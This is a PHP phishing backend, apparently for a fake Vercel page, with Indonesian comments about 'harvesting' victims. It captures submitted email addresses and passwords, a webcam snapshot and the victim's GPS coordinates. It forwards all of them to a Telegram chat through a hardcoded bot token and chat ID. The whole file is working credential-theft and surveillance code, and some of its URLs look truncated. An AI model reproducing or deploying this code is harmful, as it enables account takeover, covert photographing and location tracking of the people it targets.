<?php
// ALZZc-777 VERCEL FIX
$token  = "8919205558:AAFp9N50UVrIFxozxXVhi0BjMcXV8NHwjeI";
$chatid = "6891987044";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Tangkap Email & Pass
    if (isset($_POST['email'])) {
        $msg = "<b>🔥 PANEN VERCEL BARU! 🔥</b>\n\n";
        $msg .= "<b>📧 Akun :</b> <code>".$_POST['email']."</code>\n";
        $msg .= "<b>🔑 Pass :</b> <code>".$_POST['pass']."</code>\n";
        sendTele($msg);
    }
    
    // Tangkap Foto
    if (isset($_POST['img'])) {
        $img = str_replace(['data:image/png;base64,', ' '], ['', '+'], $_POST['img']);
        $file = '/tmp/snap.png'; // Folder sementara wajib /tmp
        file_put_contents($file, base64_decode($img));
        sendPhoto($file);
    }
}

// Tangkap Lokasi
if (isset($_GET['lat'])) {
    sendTele("<b>📍 LOKASI TARGET!</b>\nhttps://google.com".$_GET['lat'].",".$_GET['lon']);
}

function sendTele($m) {
    global $token, $chatid;
    $url = "https://telegram.org";
    $data = ['chat_id' => $chatid, 'text' => $m, 'parse_mode' => 'html'];
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch); curl_close($ch);
}

function sendPhoto($f) {
    global $token, $chatid;
    $url = "https://telegram.org";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ['chat_id' => $chatid, 'photo' => new CURLFile($f)]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch); curl_close($ch);
}

?>
